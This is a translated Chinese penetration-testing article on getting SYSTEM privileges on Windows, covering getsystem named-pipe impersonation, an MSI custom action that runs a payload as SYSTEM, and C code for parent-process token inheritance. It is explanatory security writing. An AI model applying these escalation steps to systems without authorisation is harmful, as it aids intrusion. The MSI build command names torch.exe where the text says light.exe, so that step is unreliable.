# 【技术分享】获取SYSTEM权限的多种方法

## 译文声明
本文为翻译文章，原文来源：[blog.xpnsec.com](http://blog.xpnsec.com)。译文仅供参考，具体内容及含义请以原文为准。
- 译者：shan66 ([个人主页](http://bobao.360.cn/member/contribute?uid=2522399780))
- 预估稿费：200RMB
- 投稿方式：发送邮件至 linwei#360.cn 或登录网页版在线投稿

## 简介
对于许多渗透测试人员来说，Meterpreter中的`getsystem`命令已成为获取SYSTEM账户权限的默认方法。然而，您是否曾思考过其工作原理？在本文中，我们将详细介绍这种技术的工作机制，并探讨其他一些不太流行但更易绕过安全检测的方法。

## Meterpreter 的 `getsystem`
如果您尚未使用过Meterpreter中的`getsystem`模块，这里简单介绍一下：`getsystem`是Metasploit Framework提供的一个模块，可以将管理账户（通常是本地Administrator账户）提升为本地SYSTEM账户。

### 模拟用户
在深入探讨之前，我们先了解一下Windows中的模拟功能。模拟允许一个进程采用另一个用户的权限上下文运行。例如，在FTP服务器中，进程可以验证用户身份并仅允许他们访问特定文件。Windows提供了多个API来实现模拟，如：
- `ImpersonateNamedPipeClient`
- `ImpersonateLoggedOnUser`
- `ReturnToSelf`
- `LogonUser`
- `OpenProcessToken`

其中，`ImpersonateNamedPipeClient` API是`getsystem`模块的核心。该API调用允许一个进程模拟连接到命名管道并对管道进行写入操作的另一进程的访问令牌。为了成功模拟，进程需要具有`SeImpersonatePrivilege`权限，该权限通常只授予高特权用户，包括本地Administrator账户。

### `getsystem` 工作原理
1. `getsystem`创建一个新的Windows服务，该服务连接命名管道时以SYSTEM身份运行。
2. `getsystem`生成一个进程，该进程创建命名管道并等待来自上述服务的连接。
3. Windows服务启动并连接到命名管道。
4. 上述生成的进程接收连接，并调用`ImpersonateNamedPipeClient`，从而获得SYSTEM用户的模拟令牌。
5. 使用新收集的SYSTEM模拟令牌生成`cmd.exe`，从而获得具有SYSTEM权限的进程。

我曾经发布了一个简单的工具，可以在不借助Meterpreter-Framework的情况下实现这一功能。该工具的运行机制与上述步骤相同，下载地址如下：[链接]。

下面的视频展示了它的具体执行过程：[视频链接]

## MSIExec 方法
最近，我在Twitter上分享了一种通过.MSI包生成具有SYSTEM权限进程的方法：

> “将PowerShell单行脚本嵌入.MSI文件中是一种很好的替代方法，可以以SYSTEM权限执行。” — Adam (@_xpn_) 2017年11月6日 [推文链接]

这种方法源于我对DOQU 2.0恶意软件的研究，攻击者正在将恶意软件封装在MSI文件中进行传播。

### 原理
通过MSI启动代码的好处是可以在安装过程中获得SYSTEM权限。为此，我们需要研究WIX Toolset，这是一个开源项目，可以从XML构建脚本创建MSI文件。

WIX框架由多个工具组成，重点关注以下两个：
- `candle.exe`：接收.WIX XML文件并输出.WIXOBJ
- `light.exe`：接收.WIXOBJ并创建.MSI

WIX文档中提到了自定义操作，通过设置`Impersonate`属性为`false`，可以让MSI以SYSTEM身份启动进程。

### 示例
我们的WIX文件可能如下所示：
```xml
<CustomAction Id="RunAsSystem" Directory="TARGETDIR" ExeCommand="[CMDLINE]" Impersonate="no" />
<CustomAction Id="FailInstall" Execute="immediate" Return="check" ExeCommand="invalid vbs to fail install" />

<InstallExecuteSequence>
  <Custom Action="RunAsSystem" Before="InstallFinalize">NOT Installed</Custom>
  <Custom Action="FailInstall" After="RunAsSystem">NOT Installed</Custom>
</InstallExecuteSequence>
```

编译成MSI文件的命令：
```sh
candle.exe msigen.wix
torch.exe msigen.wixobj
```

运行MSI文件即可执行payload。

## PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 方法
这种方法由James Forshaw提出，用于变成“受信任的安装程序”。

### 原理
通过`CreateProcess` Win32 API调用和`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`属性设置新生成进程的父进程。如果设置了父进程，新进程将继承父进程的令牌，从而获取SYSTEM账户的权限。

示例代码：
```c
int pid;
HANDLE pHandle = NULL;
STARTUPINFOEXA si;
PROCESS_INFORMATION pi;
SIZE_T size;
BOOL ret;

// 设置PID为SYSTEM进程的PID
pid = 555;
EnableDebugPriv();

// 打开将要继承句柄的进程
pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// 初始化STARTUPINFOEXA结构
ZeroMemory(&si, sizeof(si));
si.StartupInfo.cb = sizeof(si);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(pHandle), NULL, NULL);

// 创建新进程
ret = CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

通过这些方法，您可以更灵活地获取SYSTEM权限。希望本文对您有所帮助。